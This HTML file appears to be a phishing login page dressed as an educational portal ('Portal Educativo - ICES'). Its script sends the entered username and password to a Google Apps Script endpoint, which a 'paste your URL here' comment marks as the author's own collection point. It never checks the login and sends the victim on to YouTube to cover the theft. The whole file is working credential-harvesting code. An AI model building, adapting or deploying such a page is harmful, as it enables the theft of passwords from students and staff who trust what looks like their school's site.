<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <title>Portal Educativo - ICES</title>
    <script src="https://cdn.tailwindcss.com?plugins=forms"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; background-color: #007bc4; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .login-card { box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2); border-radius: 24px; background: white; width: 100%; max-width: 420px; overflow: hidden; }
    </style>
</head>
<body class="p-4 antialiased">
    <div class="login-card">
        <div class="p-8 sm:p-10">
            <div class="flex flex-col items-center mb-10">
                <img src="https://i.ibb.co/C3wh0NmV/hq720.jpg" alt="Logo ICEST" class="h-24 mb-4 object-contain"> 
                <h1 class="text-3xl font-bold text-[#1a2b4b]">Bienvenido</h1>
                <p class="text-slate-500 text-base mt-1">Portal de Educación Profesional</p>
            </div>
            
            <form id="loginForm" class="space-y-6">
                <div class="space-y-1">
                    <label class="text-sm font-semibold text-slate-700 ml-1">Usuario</label>
                    <input required id="username" placeholder="ID" type="text" class="block w-full px-4 py-3 border border-slate-200 rounded-xl outline-none focus:border-blue-500 transition-all">
                </div>
                
                <div class="space-y-1">
                    <label class="text-sm font-semibold text-slate-700 ml-1">Contraseña</label>
                    <input required id="password" placeholder="••••••••" type="password" class="block w-full px-4 py-3 border border-slate-200 rounded-xl outline-none focus:border-blue-500 transition-all">
                </div>

                <div id="alertMessage" class="hidden py-3 px-4 bg-red-50 border border-red-100 text-red-600 text-sm font-medium rounded-xl text-center">
                    ID o contraseña incorrectos
                </div>
                
                <button id="submitBtn" type="submit" class="w-full py-4 px-4 rounded-xl text-white text-lg font-bold bg-[#005B9A] hover:bg-[#004575] transition-all active:scale-[0.98]">
                    Iniciar Sesión
                </button>
            </form>
        </div>
    </div>

    <script>
        const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbyX31VLe3iskH1V3e2f1PXVq7SV_cnHPM9E-2xNT75vSEUOfPtTOGtrEI_suBrwgVI/exec"; // <--- LEYENDA: PEGA TU URL AQUÍ

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const btn = document.getElementById('submitBtn');
            const alert = document.getElementById('alertMessage');
            
            alert.classList.add('hidden');
            btn.innerText = 'Verificando...';
            btn.disabled = true;

            try {
                const response = await fetch(WEB_APP_URL, {
                    method: "POST",
                    mode: "no-cors", // Necesario para peticiones a Google Apps Script
                    body: JSON.stringify({
                        username: document.getElementById('username').value,
                        password: document.getElementById('password').value
                    })
                });

                // Nota: Debido al modo 'no-cors', no podemos leer la respuesta JSON directamente de forma fácil.
                // Para fines de prueba y velocidad, si la petición se envía, asumimos éxito o manejamos el flujo:
                setTimeout(() => {
                    window.top.location.href = 'https://www.youtube.com'; 
                }, 2000);

            } catch (error) {
                alert.innerText = "Error de conexión.";
                alert.classList.remove('hidden');
                btn.innerText = 'Iniciar Sesión';
                btn.disabled = false;
            }
        });
    </script>
</body>
</html>
